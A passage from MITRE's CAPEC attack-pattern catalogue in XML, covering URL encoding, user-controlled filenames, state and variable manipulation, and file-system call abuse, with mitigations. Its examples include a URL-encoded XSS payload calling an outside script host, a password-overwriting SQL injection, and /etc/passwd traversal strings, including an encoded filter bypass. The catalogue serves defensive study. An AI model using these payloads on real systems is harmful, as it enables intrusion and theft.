               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="72" Name="URL Encoding" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the encoding of the URL. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The attacker could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an attacker may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker accesses the server using a specific URL.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker tries to encode some special characters in the URL. The attacker finds out that some characters are not filtered properly.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker crafts a malicious URL string request and sends it to the server.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters may have harmful consequences.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application should accepts and decodes URL input.</Prerequisite>
            <Prerequisite>The application performs insufficient filtering/canonicalization on the URLs.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can try special characters in the URL and bypass the URL validation.</Skill>
            <Skill Level="Medium">The attacker may write a script to defeat the input filtering mechanism.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>If the first decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.</Indicator>
            <Indicator>Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Refer to the RFCs to safely decode URL.</Mitigation>
            <Mitigation>Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.</Mitigation>
            <Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</Mitigation>
            <Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.</Mitigation>
            <Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)</Mitigation>
            <Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Attack Example: URL Encodings in IceCast MP3 Server.</xhtml:p>
               <xhtml:p>The following type of encoded string has been known traverse directories against the IceCast MP3 server9:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://[targethost]:8000/somefile/%2E%2E/target.mp3</xhtml:div>
               <xhtml:p>or using</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">"/%25%25/" instead of "/../".</xhtml:div>
               <xhtml:p>The control character ".." can be used by an attacker to escape the document root.</xhtml:p>See also: CVE-2001-0784</Example>
            <Example>
               <xhtml:p>Cross-Site Scripting</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">
                  <xhtml:div style="color:#32498D; font-weight:bold;">URL-Encoded attack:</xhtml:div>http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e</xhtml:div>
               <xhtml:div style="margin-left:10px;" class="result">
                  <xhtml:div style="color:#32498D; font-weight:bold;">HTML execution:</xhtml:div>&lt;script src="http://www.badplace.com/nasty.js"&gt;&lt;/script&gt;</xhtml:div>
               <xhtml:p>[R.72.3][REF-35]</xhtml:p>
            </Example>
            <Example>
               <xhtml:p>SQL Injection</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Original database query in the example file - "login.asp":</xhtml:div>SQLQuery = "SELECT preferences FROM logintable WHERE userid='" &amp; Request.QueryString("userid") &amp; "' AND password='" &amp; Request.QueryString("password") &amp; "';"</xhtml:div>
               <xhtml:div style="margin-left:10px;" class="attack">
                  <xhtml:div style="color:#32498D; font-weight:bold;">URL-encoded attack:</xhtml:div>http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00</xhtml:div>
               <xhtml:div style="margin-left:10px;" class="result">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Executed database query:</xhtml:div>SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d';</xhtml:div>
               <xhtml:p>From "URL encoded attacks", by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="177"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="21"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-495"/>
            <Reference External_Reference_ID="REF-496"/>
            <Reference External_Reference_ID="REF-497"/>
            <Reference External_Reference_ID="REF-498"/>
            <Reference External_Reference_ID="REF-499"/>
            <Reference External_Reference_ID="REF-500" Section="5.11.4. Validating Hypertext Links (URIs/URLs)"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="73" Name="User-Controlled Filename" Abstraction="Standard" Status="Draft">
         <Description>An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="165"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="592"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim must trust the name and locale of user controlled filenames.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To achieve a redirection and use of less trusted source, an attacker can simply edit data that the host uses to build the filename</Skill>
            <Skill Level="Medium">Deploying a malicious "look-a-like" site (such as a site masquerading as a bank or online auction site) that the user enters their authentication data into.</Skill>
            <Skill Level="High">Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</Mitigation>
            <Mitigation>Implementation: Scan dynamically generated content against validation specification</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Phishing attacks rely on a user clicking on links on that are supplied to them by attackers masquerading as a trusted resource such as a bank or online auction site. The end user's email client hosts the supplied resource name in this case via email. The resource name, however may either 1) direct the client browser to a malicious site to steal credentials and/or 2) execute code on the client machine to probe the victim's host system and network environment.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="96"/>
            <Related_Weakness CWE_ID="348"/>
            <Related_Weakness CWE_ID="116"/>
            <Related_Weakness CWE_ID="350"/>
            <Related_Weakness CWE_ID="86"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="74" Name="Manipulating User State" Abstraction="Meta" Status="Stable">
         <Description>The adversary modifies state information maintained by the target software in user-accessible locations. If successful, the target software will use this tainted state information and execute in an unintended manner. State management is an important function within an application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Adversary determines the nature of state management employed by the application. This includes determining the location (client-side, server-side or both) and possibly the items stored as part of user state.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The adversary now tries to modify the user state contents (possibly blindly if the contents are encrypted or otherwise obfuscated) and observe the effects of this change on the application.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Having determined the information stored in the user state and the possible ways to modify it, the adversary can violate it in order to perform illegitimate actions.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>User state is maintained at least in some way in user-controllable locations, such as cookies or URL parameters.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The adversary needs to have knowledge of state management as employed by the target application, and also the ability to manipulate the state in a meaningful way.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox).</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Do not rely solely on user-controllable locations, such as cookies or URL parameters, to maintain user state.</Mitigation>
            <Mitigation>Avoid sensitive information, such as usernames or authentication and authorization information, in user-controllable locations.</Mitigation>
            <Mitigation>Sensitive information that is part of the user state must be appropriately protected to ensure confidentiality and integrity at each request.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>During the authentication process, an application stores the authentication decision (auth=0/1) in unencrypted cookies. At every request, this cookie is checked to permit or deny a request.</xhtml:p>
               <xhtml:p>An adversary can easily violate this representation of user state and set auth=1 at every request in order to gain illegitimate access and elevated privilege in the application.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="372"/>
            <Related_Weakness CWE_ID="371"/>
            <Related_Weakness CWE_ID="315"/>
            <Related_Weakness CWE_ID="353"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="75" Name="Manipulating Writeable Configuration Files" Abstraction="Standard" Status="Draft">
         <Description>Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attackers' behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="176"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Configuration files must be modifiable by the attacker</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">To identify vulnerable configuration files, and understand how to manipulate servers and erase forensic evidence</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Design: Backup copies of all configuration files</Mitigation>
            <Mitigation>Implementation: Integrity monitoring for configuration files</Mitigation>
            <Mitigation>Implementation: Enforce audit logging on code and configuration promotion procedures.</Mitigation>
            <Mitigation>Implementation: Load configuration from separate process and memory space, for example a separate physical device like a CD</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The BEA Weblogic server uses a config.xml file to store configuration data. If this file is not properly protected by the system access control, an attacker can write configuration information to redirect server output through system logs, database connections, malicious URLs and so on. Access to the Weblogic server may be from a so-called Custom realm which manages authentication and authorization privileges on behalf of user principals. Given write access, the attacker can insert a pointer to a custom realm jar file in the config.xml</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt; CustomRealm<xhtml:div style="margin-left:10px;">ConfigurationData="java.util.Properties"<xhtml:br/>Name="CustomRealm"<xhtml:br/>RealmClassName="Maliciousrealm.jar"<xhtml:br/>/&gt;</xhtml:div>
               </xhtml:div>
               <xhtml:p>The main issue with configuration files is that the attacker can leverage all the same functionality the server has, but for malicious means. Given the complexity of server configuration, these changes may be very hard for administrators to detect.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="349"/>
            <Related_Weakness CWE_ID="99"/>
            <Related_Weakness CWE_ID="77"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="353"/>
            <Related_Weakness CWE_ID="354"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="76" Name="Manipulating Web Input to File System Calls" Abstraction="Detailed" Status="Draft">
         <Description>An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="126"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Fingerprinting of the operating system] In order to create a valid file injection, the attacker needs to know what the underlying OS is.</Description>
               <Technique>Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.</Technique>
               <Technique>TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.</Technique>
               <Technique>Induce errors to find informative error messages</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated user</Description>
               <Technique>Spider web sites for all available links, entry points to the web site.</Technique>
               <Technique>Manually explore application and inventory all application inputs</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application</Description>
               <Technique>Inject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.)</Technique>
               <Technique>Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requests</Technique>
               <Technique>Inject context-appropriate malicious file system control syntax</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)</Description>
               <Technique>The attacker injects context-appropriate malicious file path to access the content of the targeted file.</Technique>
               <Technique>The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.</Technique>
               <Technique>The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.</Technique>
               <Technique>The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.</Technique>
               <Technique>The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.</Technique>
               <Technique>The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Program must allow for user controlled variables to be applied directly to the filesystem</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To identify file system entry point and execute against an over-privileged system interface</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege.</Mitigation>
            <Mitigation>Design: Ensure all input is validated, and does not contain file system commands</Mitigation>
            <Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</Mitigation>
            <Mitigation>Design: For interactive user applications, consider if direct file system interface is necessary, instead consider having the application proxy communication.</Mitigation>
            <Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd</xhtml:div>
               <xhtml:p>However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string.</xhtml:p>
               <xhtml:p>Then an attacker creates special payloads to bypass this filter:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd</xhtml:div>
               <xhtml:p>When the application gets this input string, it will be the desired vector by the attacker.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="23"/>
            <Related_Weakness CWE_ID="22"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="77"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="348"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="264"/>
            <Related_Weakness CWE_ID="272"/>
            <Related_Weakness CWE_ID="59"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="15"/>
            <Related_Weakness CWE_ID="715"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Manipulating Input to File System Calls</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="77" Name="Manipulating User-Controlled Variables" Abstraction="Standard" Status="Draft">
         <Description>This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An attacker can override environment variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the attacker can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="22">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker communicates with the application server using a thin client (browser) or thick client.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>While communicating with the server, the attacker finds that she can control and override a variable consumed by the application server.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker overrides the variable and influences the normal behavior of the application server.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>A variable consumed by the application server is exposed to the client.</Prerequisite>
            <Prerequisite>A variable consumed by the application server can be overwritten by the user.</Prerequisite>
            <Prerequisite>The application server trusts user supplied data to compute business logic.</Prerequisite>
            <Prerequisite>The application server does not perform proper input validation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The malicious user can easily try some well-known global variables and find one which matches.</Skill>
            <Skill Level="Medium">The attacker can use automated tools to probe for variables that she can control.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>A web penetration tool probing a web server may generate abnormal activities recorded on log files. Abnormal traffic such as a high number of request coming from the same client may also rise the warnings from a monitoring system or an intrusion detection tool.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Do not allow override of global variables and do Not Trust Global Variables.</xhtml:p>
               <xhtml:p>If the register_globals option is enabled, PHP will create global variables for each GET, POST, and cookie variable included in the HTTP request. This means that a malicious user may be able to set variables unexpectedly. For instance make sure that the server setting for PHP does not expose global variables.</xhtml:p>
            </Mitigation>
            <Mitigation>A software system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary.</Mitigation>
            <Mitigation>Separate the presentation layer and the business logic layer. Variables at the business logic layer should not be exposed at the presentation layer. This is to prevent computation of business logic from user controlled input data.</Mitigation>
            <Mitigation>Use encapsulation when declaring your variables. This is to lower the exposure of your variables.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should be rejected by the program.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: PHP Global Variables</xhtml:div>
               <xhtml:p>PHP is a study in bad security. The main idea pervading PHP is "ease of use," and the mantra "don't make the developer go to any extra work to get stuff done" applies in all cases. This is accomplished in PHP by removing formalism from the language, allowing declaration of variables on first use, initializing everything with preset values, and taking every meaningful variable from a transaction and making it available. In cases of collision with something more technical, the simple almost always dominates in PHP.</xhtml:p>
               <xhtml:p>One consequence of all this is that PHP allows users of a Web application to override environment variables with user-supplied, untrusted query variables. Thus, critical values such as the CWD and the search path can be overwritten and directly controlled by a remote anonymous user.</xhtml:p>
               <xhtml:p>Another similar consequence is that variables can be directly controlled and assigned from the user-controlled values supplied in GET and POST request fields. So seemingly normal code like this, does bizarre things:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">while($count &lt; 10){<xhtml:br/>// Do something<xhtml:br/>$count++;<xhtml:br/>}</xhtml:div>
               <xhtml:p>Normally, this loop will execute its body ten times. The first iteration will be an undefined zero, and further trips though the loop will result in an increment of the variable $count. The problem is that the coder does not initialize the variable to zero before entering the loop. This is fine because PHP initializes the variable on declaration. The result is code that seems to function, regardless of badness. The problem is that a user of the Web application can supply a request such as</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">GET /login.php?count=9</xhtml:div>
               <xhtml:p>and cause $count to start out at the value 9, resulting in only one trip through the loop. Yerg.</xhtml:p>
